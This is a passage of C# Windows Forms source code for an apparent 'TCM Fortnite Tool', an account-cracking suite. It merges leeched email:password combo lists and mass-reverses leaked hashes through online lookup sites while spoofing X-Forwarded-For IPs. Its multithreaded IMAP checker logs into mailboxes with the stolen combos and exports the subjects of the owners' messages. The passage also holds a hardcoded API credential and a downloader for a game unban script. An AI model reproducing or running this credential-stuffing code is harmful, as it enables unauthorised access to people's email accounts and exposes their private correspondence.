        private void LeecherRemoveDupedCombos_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Only Remove Duplicated Once You Are Finished Leeching The Links, Is It Done?", "WAIT!", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                Thread RemoveDuplicatedCombos = new Thread(RemoveThemDupedCombos);
                CheckForIllegalCrossThreadCalls = false;
                RemoveDuplicatedCombos.Start();
            }
            else if (dialogResult == DialogResult.No)
            {

            }    
        }

        private void LeechedCombosSave_Click(object sender, EventArgs e)
        {
            string LeechedCombos = null;
            if (LeecherCombos.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid Leeched Combos before saving nothing, Crack head :D");
                return;
            }
            try
            {
                string LeechedItemCount = LeecherCombos.Items.Count.ToString();
                saveFileDialog7.FileName = LeechedItemCount + " Leeched Combos By TCM Fortnite Tool";
                saveFileDialog7.Filter = "Text File | *.txt";
                if (saveFileDialog7.ShowDialog() == DialogResult.OK)
                {
                    LeechedCombos = saveFileDialog7.FileName;
                }
            }
            catch
            {
                MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
            }
            try
            {
                System.IO.StreamWriter SaveFileAlive = new System.IO.StreamWriter(LeechedCombos);
                foreach (var item in LeecherCombos.Items)
                {
                    SaveFileAlive.WriteLine(item);
                }
                SaveFileAlive.Close();
            }
            catch
            {

            }
            LeechedCombos = null;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (ChooseTimeFrameScraper.SelectedItem.ToString() == "Day")
            {
                UseAllForgoogle = "d";
            }
            if (ChooseTimeFrameScraper.SelectedItem.ToString() == "Week")
            {
                UseAllForgoogle = "w";
            }
            if (ChooseTimeFrameScraper.SelectedItem.ToString() == "Month")
            {
                UseAllForgoogle = "m";
            }
            if (ChooseTimeFrameScraper.SelectedItem.ToString() == "Year")
            {
                UseAllForgoogle = "y";
            }
            if (ChooseTimeFrameScraper.SelectedItem.ToString() == "All")
            {
                UseAllForgoogle = "all";
            }
        }

        private void ProxyLeecherChooseProxies_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (ProxyLeecherChooseProxies.SelectedItem.ToString() == "HTTP/S")
            {
                cmbProxyType.SelectedIndex = 0;
            }
            if (ProxyLeecherChooseProxies.SelectedItem.ToString() == "SOCKS 4")
            {
                cmbProxyType.SelectedIndex = 1;
            }
            if (ProxyLeecherChooseProxies.SelectedItem.ToString() == "SOCKS 5")
            {
                cmbProxyType.SelectedIndex = 2;
            }
            if (ProxyLeecherChooseProxies.SelectedItem.ToString() == "Proxyless")
            {
                cmbProxyType.SelectedIndex = 3;
            }
        }

        private void LoadProxiesComboLeecher_Click(object sender, EventArgs e)
        {
            btnProxy_Click(null, null);
        }

        private void LeechSomeCombos_CheckedChanged(object sender)
        {
            if(LeechSomeCombos.Checked)
            {
                nsLabel75.Value1 = "Total Combos";
                LeechSomeProxies.Checked = false;
            }
        }

        private void LeechSomeProxies_CheckedChanged(object sender)
        {
            if (LeechSomeProxies.Checked)
            {
                nsLabel75.Value1 = "Total Proxies";
                LeechSomeCombos.Checked = false;
            }
        }

        private void FileMergerFilesToAdd_DragDrop(object sender, DragEventArgs e)
        {
            if (!Directory.Exists("MergeFiles"))
            {
                Directory.CreateDirectory("MergeFiles");
            }
            nsButton40_Click(null, null);
            string path = Directory.GetCurrentDirectory();
            clearFolder(path + "//MergeFiles//");
            string result;
            string result2;
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop, false);
            foreach (string file in files)
            {
                result = Path.GetFileName(file);
                result2 = Path.GetFullPath(file);
                if (result.Contains(".txt"))
                {
                    string fileToCopy = result2;
                    string destinationDirectory = path + "//MergeFiles//";
                    File.Copy(fileToCopy, destinationDirectory + Path.GetFileName(fileToCopy));
                }
            }
            ListFileNames();
        }

        private void clearFolder(string FolderName)
        {
            DirectoryInfo dir = new DirectoryInfo(FolderName);

            foreach (FileInfo fi in dir.GetFiles())
            {
                fi.Delete();
            }

            foreach (DirectoryInfo di in dir.GetDirectories())
            {
                clearFolder(di.FullName);
                di.Delete();
            }
        }

        public void ListFileNames()
        {
            string path = Directory.GetCurrentDirectory();
            DirectoryInfo d = new DirectoryInfo(path + "//MergeFiles");//Assuming Test is your Folder
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
            string str = "";
            foreach (FileInfo file in Files)
            {
                str = file.Name;
                FileMergerFilesToAdd.Items.Add(str.Replace(".txt", ""));
                TotalFilesThatHaveBeenLoaded.Text = FileMergerFilesToAdd.Items.Count.ToString();
            }
        }

        private void FileMergerFilesToAdd_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void AddFinalToListbox()
        {
            string path = Directory.GetCurrentDirectory();
            FinalFileLineCountMerger.Text = File.ReadAllText("MergeFiles//FinalMergedFiles.txt");
            string formattype = "{0:#,###,###.##}";
            int TotalLinesHere = FinalFileLineCountMerger.Lines.Count();
            TotalLinesInMergedFiles.Text = string.Format(formattype, TotalLinesHere);
            clearFolder(path + "//MergeFiles//");
        }

        public void MergeFinalFiles()
        {
            string path = Directory.GetCurrentDirectory();
            DirectoryInfo d = new DirectoryInfo(path + "//MergeFiles");//Assuming Test is your Folder
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
            string str = "";
            int i = 0;
            foreach (FileInfo file in Files)
            {
                i++;
                str = file.Name;
                Console.WriteLine(str);
                string ReadTextMerger = System.IO.File.ReadAllText("MergeFiles//" + str);
                using (StreamWriter MergeFiles = File.AppendText("MergeFiles//FinalMergedFiles.txt"))
                {
                    MergeFiles.WriteLine(ReadTextMerger);
                }
                TotalFilesMergedAndDone.Text = i + "/" + FileMergerFilesToAdd.Items.Count + " Files!";
            }
            TotalLinesInMergedFiles.Text = "Please Wait... Combining...";
            Thread AddHudeFileToTxt = new Thread(AddFinalToListbox);
            CheckForIllegalCrossThreadCalls = false;
            AddHudeFileToTxt.Start();
        }

        private void MergeTheFiles_Click(object sender, EventArgs e)
        {
            Thread CombineFiles = new Thread(MergeFinalFiles);
            CheckForIllegalCrossThreadCalls = false;
            CombineFiles.Start();
        }

        private void nsButton40_Click(object sender, EventArgs e)
        {
            FileMergerFilesToAdd.Items.Clear();
            try
            {
                string path = Directory.GetCurrentDirectory();
                clearFolder(path + "//MergeFiles//");
            }
            catch { }
            TotalFilesThatHaveBeenLoaded.Text = FileMergerFilesToAdd.Items.Count.ToString();
        }

        /// <summary>
        /// HASHING SHIT
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        /// 
        private void UpdateListBoxesForDehasher()
        {
            DehashedSuccessfully.SelectedIndex = DehashedSuccessfully.Items.Count - 1;
            DehashedFailed.SelectedIndex = DehashedFailed.Items.Count - 1;
            HashesLeftToCheckFor.Text = Dehash.Count.ToString();
        }
        private void DoWorkHashDehash()
        {
            _IsGood = true;
            while (_Run)
            {
                lock (tLock)
                {
                    if (Dehash.Count > 5)
                    {

                    }
                    else
                    {
                        _Run = false;
                        _IsGood = false;
                        break;
                    }
                }
                if (Dehash.Count >= 0)
                {
                    while (_IsGood)
                    {
                        if (_Run.Equals(false))
                            return;
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            try
                            {
                                string HashToLookup = "";
                                string AccountEmail = "";
                                string EmailPassDehash = "";
                                httpRequest.ClearAllHeaders();
                                int ProxyTimeoutTimer = (int)1500;
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                                httpRequest.KeepAlive = true;
                                httpRequest.Cookies = new CookieDictionary(false);
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.ConnectTimeout = ProxyTimeoutTimer;
                                httpRequest.AllowAutoRedirect = false;
                                string RandomFirstDigitIP = FuckingProxyless1.Next(0, 255).ToString();
                                string RandomSecondDigitIP = FuckingProxyless2.Next(0, 255).ToString();
                                string RandomThirdDigitIP = FuckingProxyless3.Next(0, 255).ToString();
                                string RandomFourthDigitIP = FuckingProxyless4.Next(0, 255).ToString();
                                if (IsDehasherEmailPassFormatted.Checked == false)
                                {
                                    HashToLookup = Dehash.ElementAt<string>(rnd.Next(Dehash.Count));
                                }
                                if (IsDehasherEmailPassFormatted.Checked == true)
                                {
                                    try
                                    {
                                        EmailPassDehash = Dehash.ElementAt<string>(rnd.Next(Dehash.Count));
                                        AccountEmail = EmailPassDehash.Split(':')[0];
                                        HashToLookup = EmailPassDehash.Split(':')[1];
                                    }
                                    catch
                                    {
                                        break;
                                    }
                                }
                                if (HashDecryptmd5decryptnet.Checked)
                                {
                                    try
                                    {
                                        string HashLenght = "";
                                        string FinalLenght = Regex.Replace(HashToLookup, @"\s", "");
                                        int LenghtOfHash = FinalLenght.Length;
                                        if (LenghtOfHash == 32)
                                        {
                                            HashLenght = "md5";
                                        }
                                        else if (LenghtOfHash == 40)
                                        {
                                            HashLenght = "sha1";
                                        }
                                        else if (LenghtOfHash == 64)
                                        {
                                            HashLenght = "sha256";
                                        }
                                        else if (LenghtOfHash == 96)
                                        {
                                            HashLenght = "sha384";
                                        }
                                        else if (LenghtOfHash == 128)
                                        {
                                            HashLenght = "sha512";
                                        }
                                        else
                                        {
                                            break;
                                        }
                                        if (System.Net.IPAddress.TryParse(RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP, out myAddress))
                                        {
                                            httpRequest.AddHeader("X-Forwarded-For", RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP);
                                        }
                                        string md5decryptStart = httpRequest.Get("https://md5decrypt.net/Api/api.php?hash=" + FinalLenght + "&hash_type=" + HashLenght + "&email=deanna_abshire@proxymail.eu&code=1152464b80a61728").ToString();
                                        if (md5decryptStart != "CODE ERREUR" && md5decryptStart != "" && md5decryptStart != " " && md5decryptStart != "d41d8cd98f00b204e9800998ecf8427e")
                                        {
                                            if (!IsDehasherEmailPassFormatted.Checked)
                                            {
                                                DehashedSuccessfully.Items.Add(HashToLookup + " = " + md5decryptStart);
                                                Dehash.RemoveAll(x => ((string)x) == HashToLookup);
                                                UpdateListBoxesForDehasher();
                                            }
                                            if (IsDehasherEmailPassFormatted.Checked)
                                            {
                                                DehashedSuccessfully.Items.Add(AccountEmail + ":" + md5decryptStart);
                                                Dehash.RemoveAll(x => ((string)x) == EmailPassDehash);
                                                UpdateListBoxesForDehasher();
                                            }
                                            break;
                                        }
                                    }
                                    catch (Exception ex)
                                    {

                                    }
                                }
                                if(HashCheckerhashtoolkit.Checked)
                                {
                                    try
                                    {
                                        if (System.Net.IPAddress.TryParse(RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP, out myAddress))
                                        {
                                            httpRequest.AddHeader("X-Forwarded-For", RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP);
                                        }
                                        string HastoolKitStart = httpRequest.Get("http://hashtoolkit.com/reverse-hash/?hash=" + HashToLookup).ToString();
                                        if(!HastoolKitStart.Contains("No hashes found for"))
                                        {
                                            string HastoolKitEnd = Regex.Match(HastoolKitStart, @"g?text=.*?""").Groups[0].Value;
                                            if (HastoolKitEnd != "")
                                            {
                                                string HastoolKitEndFix1 = HastoolKitEnd.Replace("text=", "");
                                                string HastoolKitEndFix2 = HastoolKitEndFix1.Replace("\"", "");
                                                if(!HastoolKitEndFix2.Contains("d41d8cd98f00b204e9800998ecf8427e"))
                                                {
                                                    if (IsDehasherEmailPassFormatted.Checked == false)
                                                    {
                                                        DehashedSuccessfully.Items.Add(HashToLookup + " = " + HastoolKitEndFix2);
                                                        Dehash.RemoveAll(x => ((string)x) == HashToLookup);
                                                        UpdateListBoxesForDehasher();
                                                    }
                                                    if (IsDehasherEmailPassFormatted.Checked == true)
                                                    {
                                                        DehashedSuccessfully.Items.Add(AccountEmail + ":" + HastoolKitEndFix2);
                                                        Dehash.RemoveAll(x => ((string)x) == EmailPassDehash);
                                                        UpdateListBoxesForDehasher();
                                                    }
                                                    break;
                                                }
                                            }
                                        } 
                                    }
                                    catch
                                    {

                                    }
                                }
                                if(HashCheckleakz.Checked)
                                {
                                    try
                                    {
                                        if (System.Net.IPAddress.TryParse(RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP, out myAddress))
                                        {
                                            httpRequest.AddHeader("X-Forwarded-For", RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP);
                                        }
                                        string LeakzStart = httpRequest.Get("https://lea.kz/api/hash/" + HashToLookup).ToString();
                                        if (LeakzStart.Contains("password") && !LeakzStart.Contains("d41d8cd98f00b204e9800998ecf8427e"))
                                        {
                                            JToken LeakzStartEnd = JObject.Parse(LeakzStart)["password"];
                                            if (IsDehasherEmailPassFormatted.Checked == false)
                                            {
                                                DehashedSuccessfully.Items.Add(HashToLookup + " = " + LeakzStartEnd);
                                                Dehash.RemoveAll(x => ((string)x) == HashToLookup);
                                                UpdateListBoxesForDehasher();
                                            }
                                            if (IsDehasherEmailPassFormatted.Checked == true)
                                            {
                                                DehashedSuccessfully.Items.Add(AccountEmail + ":" + LeakzStartEnd);
                                                Dehash.RemoveAll(x => ((string)x) == EmailPassDehash);
                                                UpdateListBoxesForDehasher();
                                            }
                                            break;
                                        }
                                    }
                                    catch
                                    {

                                    }
                                }
                                if(HashChecknitrxgennet.Checked)
                                {
                                    try
                                    {
                                        if (System.Net.IPAddress.TryParse(RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP, out myAddress))
                                        {
                                            httpRequest.AddHeader("X-Forwarded-For", RandomFirstDigitIP + "." + RandomSecondDigitIP + "." + RandomThirdDigitIP + "." + RandomFourthDigitIP);
                                        }
                                        string nitrxgenStart = httpRequest.Get("http://www.nitrxgen.net/md5db/" + HashToLookup).ToString();
                                        if (nitrxgenStart != "" && nitrxgenStart != "d41d8cd98f00b204e9800998ecf8427e")
                                        {
                                            if (IsDehasherEmailPassFormatted.Checked == false)
                                            {
                                                DehashedSuccessfully.Items.Add(HashToLookup + " = " + nitrxgenStart);
                                                Dehash.RemoveAll(x => ((string)x) == HashToLookup);
                                                UpdateListBoxesForDehasher();
                                            }
                                            if (IsDehasherEmailPassFormatted.Checked == true)
                                            {
                                                DehashedSuccessfully.Items.Add(AccountEmail + ":" + nitrxgenStart);
                                                Dehash.RemoveAll(x => ((string)x) == EmailPassDehash);
                                                UpdateListBoxesForDehasher();
                                            }
                                            Dehash.RemoveAll(s => s.TrimStart().StartsWith(HashToLookup, StringComparison.OrdinalIgnoreCase));
                                            UpdateListBoxesForDehasher();
                                            break;
                                        }
                                        if (IsDehasherEmailPassFormatted.Checked == false)
                                        {
                                            DehashedFailed.Items.Add(HashToLookup +  " = NOT FOUND!");
                                            Dehash.RemoveAll(x => ((string)x) == HashToLookup);
                                            UpdateListBoxesForDehasher();
                                        }
                                        if (IsDehasherEmailPassFormatted.Checked == true)
                                        {
                                            DehashedFailed.Items.Add(AccountEmail + ":" + HashToLookup + " NOT FOUND!");
                                            Dehash.RemoveAll(x => ((string)x) == EmailPassDehash);
                                            UpdateListBoxesForDehasher();
                                        }
                                        break;
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                            catch (Exception ex)
                            {

                            }
                        }
                    }
                }
            }
            Thread.Sleep(ThreadSleepCount);
        }

        public void StartWorkingOnDehasher()
        {
            isDone = false;
            int ThreadCount = (int)75;
            int SleepTimer = (int)1;
            Threadscount = ThreadCount;
            ThreadSleepCount = 1;

            for (int i = 0; i < Threadscount; i++)
            {
                Thread thread = new Thread(new ThreadStart(DoWorkHashDehash));
                thread.IsBackground = true;
                tList.Add(thread);
                thread.Start();
            }
            new Thread(() =>
            {
                while (Dehash.Count > 5)
                {
                    Thread.Sleep(SleepTimer);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    MessageBox.Show("Brute / Checker has been paused, Hit Start to start again!");
                }));
            })
            {
                IsBackground = true
            }.Start();
        }
        private void StartThreadingDehasher()
        {
            //if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            //{
            //    Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            //}
            //GoodProxiesSave = Path.Combine(folder, string.Format("Good Proxies By TCM's Skin Checker.txt", fileName));
            //BadProxiesChecked = Path.Combine(folder, string.Format("Bad Proxies By TCM's Skin Checker.txt", fileName));

            _Run = false;
            _Run = true;
            StartWorkingOnDehasher();
        }
        private void nsButton41_Click(object sender, EventArgs e)
        {
            try
            {
                if (Dehash.Count <= 0)
                {
                    MessageBox.Show("Please Load Some Proxies First!");
                    return;
                }
                else
                {
                    Thread DehashingStarter = new Thread(StartThreadingDehasher);
                    CheckForIllegalCrossThreadCalls = false;
                    DehashingStarter.Start();
                }
            }
            catch { }
        }

        private void LoadInHashesButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Load Proxy List";
            openFileDialog.DefaultExt = "txt";
            openFileDialog.Filter = "Text files|*.txt";
            openFileDialog.RestoreDirectory = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            try
            {
                string str = null;
                using (StreamReader streamReader = new StreamReader(new FileStream(openFileDialog.FileName, FileMode.Open, FileAccess.Read), Encoding.UTF8))
                    str = streamReader.ReadToEnd();
                if (string.IsNullOrEmpty(str))
                    return;
                Dehash.Clear();
                Dehash.AddRange(str.Split(Convert.ToChar('\n')));
                Dehash = RemoveDuplicatesIterative(Dehash);
            }
            catch (Exception ex)
            {

            }
        }

        private void nsButton42_Click(object sender, EventArgs e)
        {
            BackgroundWorker_5.CancelAsync();
        }

        private void nsButton43_Click(object sender, EventArgs e)
        {
            btnStop_Click(null, null);
        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {
            Process.Start("https://tcmpaste.com/");
        }

        private void nsButton44_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Load Combo List";
            openFileDialog.DefaultExt = "txt";
            openFileDialog.Filter = "Text files|*.txt";
            openFileDialog.RestoreDirectory = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            try
            {
                string str = null;
                using (StreamReader streamReader = new StreamReader(new FileStream(openFileDialog.FileName, FileMode.Open, FileAccess.Read), Encoding.UTF8))
                    str = streamReader.ReadToEnd();
                if (string.IsNullOrEmpty(str))
                    return;
                EACombos.Clear();
                EACombos.AddRange(str.Split(Convert.ToChar('\n')));
                EACombos = RemoveDuplicatesIterative(EACombos);
            }
            catch (Exception ex)
            {

            }
            string formattype = "{0:#,###,###.##}";
            string EACombosLoaded = string.Format(formattype, EACombos.Count);
            string MessageToShow = EACombosLoaded + " Combos Successfully Loaded!";
            EmailAccessChecksLeft.Text = EACombos.Count.ToString();
            MessageBox.Show(MessageToShow);
        }


        /// <summary>
        /// This is the email access checker start
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        /// 
        public static string[] strarray2;
        public static int BadAcccount;

        private void DoWorkEmailAccessChecker()
        {
            string AccountInfo = "";
            _IsGood = true;
            while (_Run)
            {
                lock (tLock)
                {
                    if (EACombos.Count > 5)
                    {
                        AccountInfo = EACombos.ElementAt<string>(rnd.Next(EACombos.Count));
                    }
                    else
                    {
                        _Run = false;
                        _IsGood = false;
                        break;
                    }
                }
                string[] strArray2 = AccountInfo.Split(new char[3]{';',':','|'});
                if (AccountInfo.Length >= 2)
                {
                    while (_IsGood)
                    {
                        if (_Run.Equals(false))
                            return;
                        if (CountHowManyMessages.Checked)
                        {
                            try
                            {
                                using (var clients = new ImapClient())
                                {
                                    string text = strArray2[0];
                                    string email = strArray2[0];
                                    string pass = strArray2[1];
                                    bool mail = false;
                                    var combo = text.Split('@');
                                    var xx = ClientConfig.GetConfig(combo[1]);
                                    clients.ServerCertificateValidationCallback = (s, c, h, e) => true;
                                    clients.Connect(xx.Hostname, xx.Port, true, default(CancellationToken));
                                    clients.Authenticate(email, pass);
                                    var inbox = clients.Inbox;
                                    GoodAccountsEmailAccessCheck.Items.Add(AccountInfo);
                                    if (EmailAccessCheckerExportTitles.Checked)
                                    {
                                        if (!Directory.Exists("ExportedEmailSubjects"))
                                        {
                                            Directory.CreateDirectory("ExportedEmailSubjects");
                                        }
                                        inbox.Open(FolderAccess.ReadOnly);
                                        for (int i = 0; i < inbox.Count; i++)
                                        {
                                            var message = inbox.GetMessage(i);
                                            foreach (var mailbox in message.From.Mailboxes)
                                            {
                                                using (StreamWriter vacc = File.AppendText("ExportedEmailSubjects//" + text + ".txt"))
                                                {
                                                    vacc.WriteLine(text + "Message #" + i + " Message Subject: " + message.Subject);
                                                }
                                            }
                                          }
                                            if (CountHowManyMessages.Checked)
                                            {
                                                inbox.Open(FolderAccess.ReadOnly);
                                                GoodAccountsEmailAccessCheck.Items.Add(AccountInfo);
                                                MessageCountEmailChecker.Items.Add(AccountInfo + " Has " + inbox.Count + " Messages!");
                                            }
                                        }
                                    EACombos.RemoveAll(x => ((string)x) == AccountInfo);
                                    UpdateEmailAccessInfo();
                                    clients.Disconnect(true);
                                    break;
                                }
                            }
                            catch (Exception ex)
                            {
                                BadAcccount++;
                                EACombos.RemoveAll(x => ((string)x) == AccountInfo);
                                UpdateEmailAccessInfo();
                                break;
                            }
                        }
                else if (!CountHowManyMessages.Checked)
                {
                    string text = strArray2[0];
                    if (text != null && text.Contains("@"))
                    {
                        string text2 = strArray2[0];
                        string text3 = strArray2[1];
                        string str = text.Split(new char[] { '@' })[1];
                        try
                        {
                            ImapClient imapClient = new ImapClient();
                            imapClient.Connect("imap." + str, 993, true, default(CancellationToken));
                            imapClient.Authenticate(text2, text3, default(CancellationToken));
                            imapClient.Disconnect(true, default(CancellationToken));
                            try
                            {
                                if (!GoodAccountsEmailAccessCheck.Items.Contains(AccountInfo) && AccountInfo != null)
                                {
                                    GoodAccountsEmailAccessCheck.Items.Add(AccountInfo);
                                }
                            }
                            catch
                            {
                                GoodAccountsEmailAccessCheck.Items.Add(AccountInfo);
                            }
                            EACombos.RemoveAll(x => ((string)x) == AccountInfo);
                            UpdateEmailAccessInfo();
                            break;
                        }
                        catch (Exception ex)
                        {
                            BadAcccount++;
                            EACombos.RemoveAll(x => ((string)x) == AccountInfo);
                            UpdateEmailAccessInfo();
                            break;
                        }
                    }
                }  
                    }
                }
            }
            Thread.Sleep(ThreadSleepCount);
        }

        private void UpdateEmailAccessInfo()
        {
            EmailAccessChecksLeft.Text = EACombos.Count.ToString();
            GoodAccountsEmailAccessCheckCount.Text = GoodAccountsEmailAccessCheck.Items.Count.ToString();
            BadAccountsEmailAccessCheckCount.Text = BadAcccount.ToString();
        }

        public void StartWorkEmailAccessChecker()
        {
            isDone = false;
            int ThreadCount = (int)ThreadsToRunEmailAccessChecker.Value;
            int SleepTimer = (int)ThreadSleepTimeEmailAccessChecker.Value;
            Threadscount = ThreadCount;
            ThreadSleepCount = 100;

            for (int i = 0; i < Threadscount; i++)
            {
                Thread thread = new Thread(new ThreadStart(DoWorkEmailAccessChecker));
                thread.IsBackground = true;
                tList.Add(thread);
                thread.Start();
            }
            new Thread(() =>
            {
                while (EACombos.Count > 5)
                {
                    Thread.Sleep(SleepTimer);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    MessageBox.Show("Brute / Checker has finished successfully.");
                }));
            })
            {
                IsBackground = true
            }.Start();
        }
        private void StartThreadingEmailAccessChecker()
        {
            //if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            //{
            //    Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            //}
            //GoodProxiesSave = Path.Combine(folder, string.Format("Good Proxies By TCM's Skin Checker.txt", fileName));
            //BadProxiesChecked = Path.Combine(folder, string.Format("Bad Proxies By TCM's Skin Checker.txt", fileName));
            _Run = false;
            BadAcccount = 0;
            _Run = true;
            StartWorkEmailAccessChecker();
        }

        private void nsButton45_Click(object sender, EventArgs e)
        {
            if(!File.Exists("MailKit.dll") || !File.Exists("MimeKit.dll"))
            {
                MessageBox.Show("To run this part of the tool it has some additional required files");
                DialogResult dialogResult = MessageBox.Show("Would You Like To Download The Required Files To Use This Functional?", "File Download Required!", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    webClient.DownloadFile("http://tcmtools.com/CheckerStuff/EmailAccessFiles/MailKit.dll", "MailKit.dll");
                    webClient.DownloadFile("http://tcmtools.com/CheckerStuff/EmailAccessFiles/MimeKit.dll", "MimeKit.dll");
                    MessageBox.Show("Downloaded Files Successfully, Will give it another go now!");
                    nsButton45_Click(null, null);
                    return;
                }
                else if (dialogResult == DialogResult.No)
                {
                    return;
                }
            }
            try
            {
                if (EACombos.Count <= 0)
                {
                    MessageBox.Show("Please Load Some Combos First!");
                    return;
                }
                else
                {
                    Thread ThreadProxyStart = new Thread(StartThreadingEmailAccessChecker);
                    CheckForIllegalCrossThreadCalls = false;
                    ThreadProxyStart.Start();
                }
            }
            catch { }
      
        }

        private void Dehasher_Click(object sender, EventArgs e)
        {

        }

        private void EmaiLAccessDetailedCheck_CheckedChanged(object sender)
        {

        }

        private void EACSubjectTitle_CheckedChanged(object sender)
        {
            if(CountHowManyMessages.Checked)
            {
                MessageCountEmailChecker.Visible = true;
            }
            else if(!CountHowManyMessages.Checked)
            {
                MessageCountEmailChecker.Visible = false;
            }
        }

        private void FnUnban_Click(object sender, EventArgs e)
        {
            if(!File.Exists("DeluxeUnban.bat"))
            {
                webClient.DownloadFile("http://tcmtools.com/CheckerStuff/Unbanner/FortniteUnban.rar", "FortniteUnban.rar");
                MessageBox.Show("Some files are needed to run the unbanner, Press ok to download, Extract the files into root directory!");
                Process.Start("FortniteUnban.rar");
            }
            else
            {
                MessageBox.Show("Please read what it says to do very carefully, As you will need to start this TWO seperate times as well as needing to restart your PC, Pay attention!");
                System.Diagnostics.Process.Start("DeluxeUnban.bat");
            }
        }

        private void SaveToTextLogFile_Click(object sender, EventArgs e)
        {
            string OutPutStatsFile = File.ReadAllText("StatsLog//StatsLog.txt");
            try
            {
                if (!File.Exists("StatsLog.txt"))
                {
                    File.Create("StatsLog.txt");
                }
            }
            catch
            {
                MessageBox.Show("Error creating file, Please Try again!");
                return;
            }
            try
            {
                File.WriteAllText("StatsLog.txt", OutPutStatsFile);
            }
            catch
            {
                MessageBox.Show("Error Writing File, Try Again, Usually happens if you click save very quickly after looking up stats!");
            }
        }

        private void CopyHWID_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Keep In Mind When Changing HWID, We Log This If We Notice To Many HWID Changes Your Account May Be banned!");
            if (FinalEncrypt == "")
            {
                MessageBox.Show("Error Getting HWID, Please Contact TrynCatchMe!");
                return;
            }
            try
            {
                Clipboard.SetText(FinalEncrypt);
                MessageBox.Show("Copy Successfully!");
                MessageBox.Show("Will Now Open The Page, Click Edit Profile On The Right Then Enter Your HWID!");
                Process.Start("https://tcm.tools/settings/");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                MessageBox.Show("Error Copying To ClipBoard, Please Contact TrynCatchMe About This Error!");
            }
        }
        [VirtualizeCode]
        private void nsButton3_Click_2(object sender, EventArgs e)
        {
            try
            {
                newforumlogin(ForumUser.Text, ForumPassword.Text, ApiKeyTextBox.Text, ApiSecretTextBox.Text);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                MessageBox.Show("For some reason there was an error logging you in, If this keeps happening contact @TrynCatchMe");
                NoneVIPAccess();
                enterprogram = true;
                nsButton3.Enabled = false;
                nsButton3.ForeColor = Color.Black;
            }
        }

        static Guid GetSoftwareId()
        {
            string registryPathName = "SOFTWARE\\Microsoft\\Cryptography";
            string registryKeyName = "MachineGuid";
            string machineGuid = string.Empty;

            using (RegistryKey localMachine64 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                if (localMachine64 == null)
                    throw new InvalidOperationException("This machine does not support this operation");

                using (RegistryKey cryptographyKey = localMachine64.OpenSubKey(registryPathName, false))
                {
                    if (cryptographyKey == null)
                        throw new InvalidOperationException("This machine does not support this operation");

                    machineGuid = (string)cryptographyKey.GetValue(registryKeyName, string.Empty);

                    if (string.IsNullOrEmpty(machineGuid))
                        throw new KeyNotFoundException(string.Format("Registry key not found: {0}", Path.Combine(registryPathName, registryKeyName)));
                }
            }

            return Guid.Parse(machineGuid);
        }
        [VirtualizeCode]
        private void newforumlogin(string username, string password, string apikey, string apisecret)
        {
            try
            {
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    httpRequest.ClearAllHeaders();
                    httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1#3B Win64#3B x64#3B rv:57.0) Gecko/20100101 Firefox/57.0";
                    httpRequest.KeepAlive = true;
                    httpRequest.Cookies = new CookieDictionary(false);
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.ConnectTimeout = 10000;
                    httpRequest.AllowAutoRedirect = false;
                    if (!Is2FactorEnabled.Checked)
                    {
                        string LoginParams = string.Format("token&grant_type=password&username=" + username + "&password=" + password + "&client_id=" + apikey + "&client_secret=" + apisecret);
                        string LoginFinal1 = httpRequest.Post("https://tcmtools.com/community/api/index.php?oauth/token", LoginParams, "application/x-www-form-urlencoded").ToString();
                        if (LoginFinal1.Contains("Your account has temporarily been locked due to failed login attempts."))
                        {
                            MessageBox.Show("Account has been locked due to, To mnany failed login attempts!");
                            return;
                        }
